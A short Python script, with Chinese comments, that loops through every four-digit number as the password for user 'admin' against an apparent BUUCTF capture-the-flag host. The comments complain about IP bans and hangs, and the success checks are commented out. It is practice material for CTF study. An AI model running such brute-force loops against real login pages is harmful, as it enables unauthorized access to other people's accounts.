"""
爆破...
【封ip】爬虫太频繁, chatgpt使用都会遇到封ip的。。。

爬着爬着就卡死了, 我也是服了。。。
"""
import time
import requests
import threading
import concurrent.futures
from typing import List, Tuple

def fuzz():
    url = "http://73f868db-9fce-4cbd-82aa-d6b43f99da1d.node4.buuoj.cn:81/?username=admin&password="

    for i in range(1000, 10000): # 从1000到9999
        res = requests.get(url + str(i))
        print("[*] 尝试: ", str(i))
        # if "502" in str(res.status_code): # 502, 服务器端错误。。。
        #     time.sleep(0.5)
        #     i = i - 1 # rollback to continue next...
        #     continue
        # if res.text != "密码错误，为四位数字。":
        #     print("爆破成功")
        #     print(res.text) 
        #     break
        print(res.text)
        # time.sleep(0.2)

if __name__ == "__main__":
    fuzz()